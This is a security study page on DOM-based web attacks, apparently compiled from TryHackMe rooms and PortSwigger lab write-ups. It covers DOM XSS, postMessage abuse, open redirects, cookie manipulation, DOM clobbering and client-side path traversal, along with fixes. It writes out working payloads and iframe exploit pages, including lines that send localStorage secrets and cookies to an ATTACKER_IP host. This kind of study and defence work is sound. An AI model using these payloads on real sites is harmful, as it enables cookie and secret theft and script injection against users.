---
title: "DOM-Based Attacks"
type: technique
tags: [client-side, dom, exploitation, injection, thm, web, xss]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-06-18
sources: [thm-adv-dom-attacks, payloadsallthethings-domclobbering, payloadsallthethings-cspt, git-portswigger-all-labs]
---

# DOM-Based Attacks

## What it is

DOM-based attacks exploit client-side JavaScript that reads data from an attacker-controllable source and passes it to a dangerous sink without sanitisation. The server never sees the malicious payload — the vulnerability exists and executes entirely in the browser. This includes DOM XSS, DOM clobbering, and prototype pollution gadgets in the DOM.

## How it works

The Document Object Model (DOM) is a tree representation of the HTML document. JavaScript can read from **sources** (user-controllable values) and write to **sinks** (functions or properties that affect the page). When data flows from a source to a dangerous sink without sanitisation, arbitrary script execution or page manipulation becomes possible.

## DOM Sources (attacker-controllable inputs)

| Source | How to control |
|--------|---------------|
| `location.href` / `location.search` | URL query string |
| `location.hash` | URL fragment (`#...`) |
| `document.URL` | Full URL |
| `document.referrer` | Referer header |
| `window.name` | Can be set by opener page |
| `postMessage` data | Cross-origin messaging |
| `localStorage` / `sessionStorage` | If attacker can write to these |
| `document.cookie` | If not HttpOnly |

## DOM Sinks (dangerous write destinations)

| Sink | Risk |
|------|------|
| `document.write()` | Injects raw HTML |
| `innerHTML` | Injects HTML, executes `<img onerror>`, SVG handlers, etc. |
| `outerHTML` | Same as innerHTML |
| `eval()` | Executes arbitrary JS |
| `setTimeout(str, ...)` / `setInterval(str, ...)` | Evaluates string as JS |
| `new Function(str)` | Executes JS |
| `location.href = ...` | If set to `javascript:` URI |
| `src` / `href` attributes | Can be set to `javascript:` URIs |
| jQuery `$()` selector | Treated as HTML if string starts with `<` |
| Vue.js `v-html` directive | Renders HTML, not escaped |

## DOM XSS via postMessage (web messages)

`postMessage` lets pages communicate cross-origin. If the receiving page passes the message data directly to a dangerous sink without origin validation, an attacker can deliver arbitrary payloads from a controlled page.

**Vulnerable pattern — raw innerHTML sink:**
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
});
```

Attack: host a page that embeds the target in an iframe and posts an XSS payload on load:
```html
<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

**Vulnerable pattern — location redirect sink (JavaScript URL bypass):**
```javascript
window.addEventListener('message', function(e) {
    if (e.data.indexOf('http:') > -1 || e.data.indexOf('https:') > -1) {
        location.href = e.data;
    }
});
```

The check only requires `http:` or `https:` to appear anywhere in the string — not at the start. Use a `javascript:` URL with the required string embedded in a template literal or comment:
```html
<iframe src="https://TARGET/"
        onload="this.contentWindow.postMessage('javascript:print\`https://x\`','*')">
```

**Vulnerable pattern — JSON.parse with iframe src sink:**
```javascript
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe');
    document.body.appendChild(iframe);
    var data = JSON.parse(e.data);
    if (data.type === 'load-channel') {
        iframe.src = data.url;  // javascript: URI accepted
    }
});
```

Exploit — note the escaped double quotes to satisfy JSON-within-HTML quoting:
```html
<iframe src="https://TARGET/"
    onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*");'>
</iframe>
```

**Key checks when hunting postMessage sinks:**
1. Search page JS for `addEventListener('message'` — inspect what is done with `e.data`
2. Check if origin (`e.origin`) is validated — if absent or using `indexOf` on the data, it is exploitable
3. Identify the sink: `innerHTML`, `location.href`, `iframe.src`, `eval` etc.
4. Craft exploit page that embeds target in an iframe and calls `postMessage` on load

## DOM-based open redirection via URL parameter

When a page constructs a redirect target from a URL parameter and checks only for `http://` or `https://` prefix, the attacker simply supplies a fully qualified external URL:

**Vulnerable pattern:**
```javascript
var url = /url=https?:\/\/.+/.exec(location);
if (url) location = url[0].slice(4);
```

Exploit URL:
```
https://TARGET/post?postId=5&url=https://attacker.com/
```

The `url` parameter is used as the redirect destination because it starts with `https://`. No further validation — full open redirect.

## DOM-based cookie manipulation

When a page writes `window.location` (or part of the URL) directly into `document.cookie` without sanitisation, URL parameters can break out of the cookie value and inject arbitrary HTML when the cookie is later read into the page.

**Vulnerable pattern:**
```javascript
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure';
```

If the cookie value is later reflected as a link `href`, inject via URL parameter:
```
https://TARGET/product?productId=1&evil='><script>print()</script>
```

This sets the cookie to a value containing `'><script>print()</script>`. The next page load reads the cookie into an `href` attribute, which breaks out of the attribute and executes the script.

**Two-request delivery (iframe + setTimeout):**
The cookie is written on the first load; the script fires on the second load. Use `setTimeout` to redirect the iframe after the cookie is set:
```html
<iframe name="victim" id="victim"
    src="https://TARGET/product?productId=1&'><script>print()</script>">
</iframe>
<script>
    setTimeout(() => {
        document.getElementById('victim').src = 'https://TARGET/';
    }, 500);
</script>
```

## DOM XSS via jQuery hashchange (real-world Twitter-like pattern)

```javascript
// Vulnerable code
$(window).on('hashchange', function() {
    var element = $(location.hash);  // jQuery treats hash as HTML selector
    element[0].scrollIntoView();
});
```

Attack payload in URL:
```
https://realwebsite.com#<img src=1 onerror=alert(1)>
```

Self-XSS only. To hit other users, deliver via iframe (auto-triggers hashchange):
```html
<iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

## DOM Clobbering

When a sink uses a global/property that an attacker can overwrite by injecting named HTML elements, you can hijack JS logic **without running script** - the key bypass for HTML-injection contexts where `<script>`/event handlers are filtered (markdown renderers, sanitized HTML, CSP that blocks inline JS). The DOM exposes named elements as `window.<name>` / `document.<name>`, so injected `id`/`name` attributes "clobber" expected variables.

How the DOM exposes named elements:
- `<a id=x>` makes `window.x` reference that element; `x.toString()` returns the `href`.
- Two elements with the same `name`/`id` form an `HTMLCollection`; index or nested `id` to build structure.
- `<form>` children are reachable as `form.<childname>`.

Common gadget - clobber a config/whitelist global the app trusts:
```html
<!-- target: if (window.config && config.url) loadScript(config.url) -->
<a id=config><a id=config name=url href="https://attacker/evil.js">

<!-- target: var defaultAvatar = window.DEFAULT_AVATAR || '/img/a.png' -->
<a id=DEFAULT_AVATAR href="cid:javascript:alert(1)">
```

`document.cookie`/`document.body` clobbering and the `currentScript` trick:
```html
<!-- clobber document.getElementById via an <img name=getElementById> in some libs -->
<img name=getElementById>
<!-- two-step href via HTMLCollection + form for nested .value/.href -->
<form id=x><input id=y name=z></form>
```

DOMPurify-safe HTML still allows clobbering (it permits `id`/`name`), so clobbering is the go-to when XSS is sanitized but the app reads attacker-controlled globals. Hunt: grep client JS for `window.X`/`document.X` reads where `X` is not declared, config objects pulled from `window`, and `||` defaults. Mitigate: explicit `var`/`let` declarations, `Object.freeze` on config, avoid `document.<name>` lookups, sanitizers in `SAFE_FOR_TEMPLATES`/forbid `id`+`name`.

## DOM XSS via location assignment (Twitter 2010 case study)

Twitter introduced:
```javascript
(function(g) {
    var a = location.href.split("#!")[1];
    if (a) { g.location = g.HBR = a; }
})(window);
```

Both source (`location.href.split("#!")[1]`) and sink (`window.location = ...`) were present. Payload:
```
http://twitter.com/#!javascript:alert(document.domain);
```

The vulnerability was weaponised with `onmouseover` to create a self-replicating worm that retweeted itself and redirected users to malicious pages.

## DOM XSS via Vue.js v-html sink

When a Vue component uses `v-html` with a user-controlled variable, it renders raw HTML:
```html
<!-- Vulnerable Vue template -->
<div v-html="person"></div>
```

If `person` is attacker-controlled, inject:
```html
<img src=1 onerror="setInterval(() => {
    fetch('http://ATTACKER_IP:8000?secret=' + encodeURIComponent(localStorage.getItem('secret')), {method: 'GET'});
}, 6000);">
```

This polls `localStorage` for a secret and exfiltrates it every 6 seconds.

## DOM XSS via document.write (basic vulnerable static site)

```html
<!-- Vulnerable page -->
<script>
    const name = new URLSearchParams(window.location.search).get('name');
    document.write("Hello, " + name);
</script>
```

Payload:
```
?name=<script>alert("XSS")</script>
```

Fixed version uses `textContent`:
```javascript
const name = new URLSearchParams(window.location.search).get('name');
const escapedName = encodeURIComponent(name);
document.getElementById("greeting").textContent = "Hello, " + escapedName;
```

## DOM Clobbering

DOM clobbering abuses the browser behaviour where named HTML elements (`id`, `name` attributes) are automatically accessible as global variables or properties of `document`. This can overwrite JavaScript variables expected to be objects or functions.

### Basic DOM clobbering

If application code does:
```javascript
if (window.admin) { /* execute as admin */ }
```

And the page allows HTML injection (but not direct script execution — e.g., attribute injection only), inject:
```html
<img id="admin">
```

Now `window.admin` is the `<img>` element (truthy), bypassing the check.

### Clobbering `document.getElementById` results

```javascript
// Vulnerable: assumes getElementById returns null if not found
let config = document.getElementById('config');
if (config) {
    eval(config.innerHTML);  // dangerous sink
}
```

Inject:
```html
<div id="config">alert(1)</div>
```

### Clobbering nested properties with anchor tags

`<a>` and `<form>` elements can create named properties on `document`:

```html
<a id="x"><a id="x" name="y" href="javascript:alert(1)">
```

Accessed as `document.x.y` — the `href` becomes the value.

### Clobbering deeper levels
- Clobbering `x.y.z`:
```html
<form id=x name=y><input id=z></form><form id=x></form>
```
- Clobbering `a.b.c.d`:
```html
<iframe name=a srcdoc="<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
```

### Browser-specific clobbering
- **Clobbering `forEach` (Chrome)**:
```html
<form id=x><input id=y name=z><input id=y></form>
<!-- x.y.forEach(element=>alert(element)) -->
```
- **Clobbering `document.getElementById()`**:
```html
<html id="cdnDomain">clobbered</html>
<!-- document.getElementById('cdnDomain').innerText -->
```
- **Clobbering URL attributes (`username`, `password`)**:
```html
<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">
<!-- x.username / x.password -->
```

### Clobbering to bypass DOMPurify (`xmpp:`/`cid:` protocol trick)

DOMPurify strips `href` attributes containing dangerous values, but protocols like `cid:` and `xmpp:` are allow-listed and bypass encoding of `&quot;`. Use this to smuggle a quote character that breaks out of an attribute context when the clobbered value is later used in a JS string concatenation:

```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href=cid:&quot;onerror=alert(1)//>
```

Or with `xmpp:`:
```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href=xmpp:&quot;onerror=alert(1)//>
```

This works when the application code does something like:
```javascript
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'};
let avatarImgHTML = '<img class="avatar" src="' + defaultAvatar.avatar + '">';
```

`defaultAvatar.avatar` becomes the `href` value of the second `<a>` tag. The `&quot;` is decoded to `"` at runtime, closing the `src` attribute and injecting `onerror`.

**Technique:** Post the clobber payload first (sets `window.defaultAvatar`), then post any other comment — rendering the second comment triggers the avatar lookup and the injected `onerror`.

### Clobbering `attributes` to bypass HTMLJanitor (sanitiser loop break)

HTMLJanitor (and similar sanitisers) iterate over `node.attributes` to remove disallowed attributes. If a child element clobbers the `attributes` property of the parent node, the loop variable becomes `undefined`, the loop body never runs, and all attributes survive — including event handlers.

```html
<form id=exp tabindex=1 onfocus=print()><input id=attributes>
```

- `input#attributes` clobbers `form.attributes` → `form.attributes.length` is `undefined` → the sanitiser's `for` loop exits immediately
- `onfocus=print()` on the `<form>` survives unfiltered

Deliver to victim via iframe with a hash fragment to auto-focus the form:
```html
<iframe src="https://TARGET/post?postId=7"
        onload="setTimeout(()=>this.src=this.src+'#exp',500)">
</iframe>
```

The `#exp` fragment focuses the form element after a 500 ms delay, firing `onfocus`.

### DOM clobbering to bypass prototype pollution mitigations

If `Object.prototype` is frozen but the application reads `window.someLibraryOptions`, clobbering `window.someLibraryOptions` via `<input id="someLibraryOptions">` can override the expected options object.

## Client-Side Path Traversal (CSPT)

Client-Side Path Traversal (or On-site Request Forgery) occurs when a frontend application makes a request (e.g., via `fetch` or XHR) to a URL constructed from attacker-controlled input. If the input is not properly encoded, the attacker can inject `../` sequences to redirect the request to an arbitrary endpoint.

Since the browser initiates the request, cookies and authentication tokens are automatically attached. This can be exploited for XSS or to achieve CSRF (known as **CSPT2CSRF**).

**Example CSPT to XSS:**
If a page fetches `https://example.com/api/news/<newsitemid>` based on the URL parameter:
```text
https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//
```

**CSPT to CSRF:**
A CSPT can hit state-changing API endpoints (like `../api/v4/caches/invalidate`) using a GET request, bypassing traditional anti-CSRF tokens and `SameSite=Lax` restrictions since it's a same-site frontend request.

## Methodology

1. **Map sources** — identify all user-controllable inputs that reach JavaScript: URL params, hash, form fields, cookies, `postMessage`
2. **Trace to sinks** — search JS files for dangerous sinks (`innerHTML`, `document.write`, `eval`, `location.href`, jQuery `$()`)
3. **Confirm taint flow** — verify that user input from step 1 reaches the sink from step 2 without sanitisation
4. **Test payloads** — inject and observe DOM changes via browser Inspector
5. **DOM clobbering** — look for code that references global variables or `document` named properties, then check if HTML injection (without script execution) is possible
6. **Prototype pollution to XSS** — identify client-side merge of URL params/query strings; if pollution is possible, find gadgets that use polluted properties in DOM sinks

## Key Payloads Summary

```javascript
// Basic DOM XSS via hash
location.hash = '<img src=1 onerror=alert(document.cookie)>'

// jQuery sink
#<img src=1 onerror=alert(1)>

// innerHTML sink (fragment injection)
"><img src=1 onerror=alert(1)>

// javascript: protocol in location
javascript:alert(document.cookie)

// Vue v-html exfil
<img src=1 onerror="fetch('http://ATTACKER_IP/?d='+document.cookie)">
```

## Detection and Defence

| Issue | Fix |
|-------|-----|
| `innerHTML` with user data | Use `textContent` or `innerText` instead; sanitise with DOMPurify if HTML is required |
| `document.write` | Avoid entirely; use `createElement` and `textContent` |
| `eval` / `new Function` with user data | Avoid; refactor to not require dynamic code execution |
| jQuery `$()` with user-controlled string | Validate input does not start with `<`; or use `.find()` on a known context |
| `location.href` assignment | Validate URL scheme; reject `javascript:` |
| DOM clobbering via `id`/`name` | Use `let`/`const`/`var` with explicit scopes; avoid relying on implicit global properties |
| Vue `v-html` | Use `{{ }}` template syntax instead; `v-html` only for trusted content |

## Tools

- [[burp-suite]] — proxy, DOM Invader extension for automated source/sink tracing
- Browser DevTools Inspector + Console — manual DOM manipulation and testing
- `DOMPurify` — sanitisation library for client-side HTML
- `Dom-Explorer` — A web-based tool designed for testing HTML parsers and finding mutated XSS

## PortSwigger Labs

### LAB 1 — DOM XSS using web messages (Practitioner)

Vulnerable page listens for `postMessage` and writes `e.data` straight into `innerHTML` with no origin check. Exploit from a controlled page:

```html
<iframe src="https://TARGET/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### LAB 2 — DOM XSS using web messages and a JavaScript URL (Practitioner)

Listener checks that message data contains `http:` or `https:`, then assigns it to `location.href`. Bypass: embed the required string in a template literal argument to `javascript:`:

```html
<iframe src="https://TARGET/"
        onload="this.contentWindow.postMessage('javascript:print\`https://x\`','*')"
        style="width:100%;height:100%">
```

### LAB 3 — DOM XSS using web messages and JSON.parse (Practitioner)

Listener does `JSON.parse(e.data)` and, if `type === 'load-channel'`, sets an iframe's `src` to `data.url`. No URL validation — `javascript:` accepted:

```html
<iframe src="https://TARGET/"
    onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*");'>
</iframe>
```

JSON requires double-quoted strings, so escape the inner quotes. Use single quotes for the `onload` attribute.

### LAB 4 — DOM-based open redirection (Practitioner)

Page reads the `url` parameter and redirects if it matches `/url=https?:\/\/.+/`. Supply any external URL:

```
https://TARGET/post?postId=5&url=https://attacker.com/exploit
```

### LAB 5 — DOM-based cookie manipulation (Practitioner)

Product pages write `window.location` to `document.cookie` (the `lastViewedProduct` cookie). The cookie is later rendered as an `href`. Inject via URL parameter and use a two-step iframe to trigger on reload:

```html
<iframe name="victim" id="victim"
    src="https://TARGET/product?productId=1&'><script>print()</script>">
</iframe>
<script>
    setTimeout(() => {
        document.getElementById('victim').src = 'https://TARGET/';
    }, 500);
</script>
```

### LAB 6 — Exploiting DOM clobbering to enable XSS (Expert)

Application renders comment body with `DOMPurify.sanitize()` then uses `window.defaultAvatar.avatar` in a string-concatenation sink for the avatar `<img>`. Clobber `window.defaultAvatar` using two `<a>` tags; bypass DOMPurify's `href` stripping with the `xmpp:` protocol and `&quot;` to inject a closing quote:

```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href=xmpp:&quot;onerror=alert(1)//>
```

Post this as Comment 1. Post any other Comment 2 — rendering comment 2 triggers the avatar lookup and the `onerror`.

Key script to understand:
```javascript
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'};
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```

### LAB 7 — Clobbering DOM attributes to bypass HTML filters (Expert)

Application sanitises comments with HTMLJanitor (whitelist: `input[name,type,value]`, `form[id]`, `i`, `b`, `p`). HTMLJanitor's `_sanitize()` loops over `node.attributes` to strip disallowed attributes. Clobber `form.attributes` with a child `input#attributes` — the loop variable becomes `undefined` and the `onfocus` handler survives:

```html
<form id=exp tabindex=1 onfocus=print()><input id=attributes>
```

Post as a comment. Deliver to victim with an iframe that auto-focuses the form via fragment after a short delay:

```html
<iframe src="https://TARGET/post?postId=7"
        onload="setTimeout(()=>this.src=this.src+'#exp',500)">
</iframe>
```

## Sources

- THM DOM-Based Attacks room (`https://tryhackme.com/room/dombasedattacks`)
- THM Advanced XSS room (`https://tryhackme.com/r/room/axss`)
- PortSwigger Web Security Academy — DOM-based vulnerabilities labs (git-portswigger-all-labs)
